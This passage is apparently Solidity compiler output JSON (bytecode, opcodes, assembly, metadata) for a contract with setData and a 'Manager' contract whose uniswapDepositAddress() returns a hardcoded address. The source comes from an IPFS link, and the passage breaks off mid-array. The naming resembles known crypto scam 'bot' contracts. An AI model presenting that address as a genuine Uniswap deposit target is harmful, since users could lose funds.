							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x98 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5B4B73A9 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x1B955FA7570C8C07B6B1D1793EF9172 0x28 PUSH2 0x8D51 0xD5 0x25 DELEGATECALL PUSH11 0x86A7D52FE57BBD64736F6C PUSH4 0x43000606 STOP CALLER ",
							"sourceMap": "3684:201:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;3684:201:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c80635b4b73a914602d575b600080fd5b605660048036036020811015604157600080fd5b81019080803590602001909291905050506058565b005b806000819055505056fea26469706673582212206f01b955fa7570c8c07b6b1d1793ef917228618d51d525f46a86a7d52fe57bbd64736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5B4B73A9 EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x56 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x41 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x58 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH16 0x1B955FA7570C8C07B6B1D1793EF9172 0x28 PUSH2 0x8D51 0xD5 0x25 DELEGATECALL PUSH11 0x86A7D52FE57BBD64736F6C PUSH4 0x43000606 STOP CALLER ",
							"sourceMap": "3684:201:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;3684:201:4;;;;;;;;;;;;;;;;12:1:-1;9;2:12;3154:45:4;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;3154:45:4;;;;;;;;;;;;;;;;;:::i;:::-;;;3195:1;3188:4;:8;;;;3154:45;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "30400",
								"executionCost": "81",
								"totalCost": "30481"
							},
							"external": {
								"setData(uint256)": "20220"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 3684,
									"end": 3885,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 3684,
									"end": 3885,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212206f01b955fa7570c8c07b6b1d1793ef917228618d51d525f46a86a7d52fe57bbd64736f6c63430006060033",
									".code": [
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "SHR",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH",
											"source": 4,
											"value": "5B4B73A9"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "EQ",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "tag",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 3684,
											"end": 3885,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "tag",
											"source": 4,
											"value": "3"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SUB",
											"source": 4
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "5"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "5"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH",
											"source": 4,
											"value": "20"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "ADD",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP3",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP2",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMP",
											"source": 4,
											"value": "[in]"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "tag",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "STOP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "tag",
											"source": 4,
											"value": "6"
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMPDEST",
											"source": 4
										},
										{
											"begin": 3195,
											"end": 3196,
											"name": "DUP1",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3192,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "DUP2",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "SWAP1",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "SSTORE",
											"source": 4
										},
										{
											"begin": 3188,
											"end": 3196,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 3154,
											"end": 3199,
											"name": "JUMP",
											"source": 4,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"setData(uint256)": "5b4b73a9"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"a\",\"type\":\"uint256\"}],\"name\":\"setData\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":\"E\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":{\"keccak256\":\"0x7325d748c6c1e37fc30fcac062da88b793324299391319dbdfe1b64f7e1b94cb\",\"urls\":[\"bzz-raw://9f696e0559a5cf2d269690bc6b5575b8bd3047e5632936b44d891a9621510877\",\"dweb:/ipfs/QmU6ZzNqnNRVLV1yP7xtw5DYP14BVDHu8R9umT6fefBQ5q\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 1764,
								"contract": "https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC:E",
								"label": "data",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				},
				"Manager": {
					"abi": [
						{
							"inputs": [],
							"name": "performTasks",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "uniswapDepositAddress",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "pure",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6977:7171  contract Manager {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x0c0f93a1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xfeae9ad3\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6998:7041  function performTasks() public {\r... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":6998:7041  function performTasks() public {\r... */\n    tag_6:\n      jump\t// out\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n    tag_8:\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7100:7107  address */\n      0x00\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7121:7163  0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351 */\n      0x8c3bcf4e19996edec11b5f0523c6a0151a75d351\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7114:7163  return 0x8c3bCF4E19996EDeC11b5f0523C6a0151a75d351 */\n      swap1\n      pop\n        /* \"https://ipfs.filebase.io/ipfs/QmS4bBeXXJdzcYtjK7mHnpxaCW8VoC9FhsZX7sqR3ZK3CC\":7046:7168  function uniswapDepositAddress() public pure returns (address) {\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060db8061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b6000738c3bcf4e19996edec11b5f0523c6a0151a75d35190509056fea26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0xDB DUP1 PUSH2 0x1F PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x8C3BCF4E19996EDEC11B5F0523C6A0151A75D351 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH29 0x5CD2ED4FF54CF52113D1CA38C771AE309ADACDA0D8005E79B722D2B252 AND 0xD8 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "6977:194:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;6977:194:4;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060325760003560e01c80630c0f93a1146037578063feae9ad314603f575b600080fd5b603d6087565b005b60456089565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b565b6000738c3bcf4e19996edec11b5f0523c6a0151a75d35190509056fea26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xC0F93A1 EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0xFEAE9AD3 EQ PUSH1 0x3F JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x45 PUSH1 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH20 0x8C3BCF4E19996EDEC11B5F0523C6A0151A75D351 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH29 0x5CD2ED4FF54CF52113D1CA38C771AE309ADACDA0D8005E79B722D2B252 AND 0xD8 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "6977:194:4:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;6977:194:4;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;6998:43:4;;;:::i;:::-;;7046:122;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;6998:43;:::o;7046:122::-;7100:7;7121:42;7114:49;;7046:122;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "43800",
								"executionCost": "93",
								"totalCost": "43893"
							},
							"external": {
								"performTasks()": "122",
								"uniswapDepositAddress()": "225"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 6977,
									"end": 7171,
									"name": "PUSH",
									"source": 4,
									"value": "80"
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "PUSH",
									"source": 4,
									"value": "40"
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "MSTORE",
									"source": 4
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "CALLVALUE",
									"source": 4
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "POP",
									"source": 4
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "PUSH #[$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "DUP1",
									"source": 4
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "PUSH [$]",
									"source": 4,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "CODECOPY",
									"source": 4
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "PUSH",
									"source": 4,
									"value": "0"
								},
								{
									"begin": 6977,
									"end": 7171,
									"name": "RETURN",
									"source": 4
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212207c5cd2ed4ff54cf52113d1ca38c771ae309adacda0d8005e79b722d2b25216d864736f6c63430006060033",
									".code": [
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "80"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "40"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "MSTORE",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "CALLVALUE",
											"source": 4
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "POP",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "4"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "CALLDATASIZE",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "LT",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH [tag]",
											"source": 4,
											"value": "2"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "JUMPI",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "0"
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "CALLDATALOAD",
											"source": 4
										},
										{
											"begin": 6977,
											"end": 7171,
											"name": "PUSH",
											"source": 4,
											"value": "E0"
										},
										{
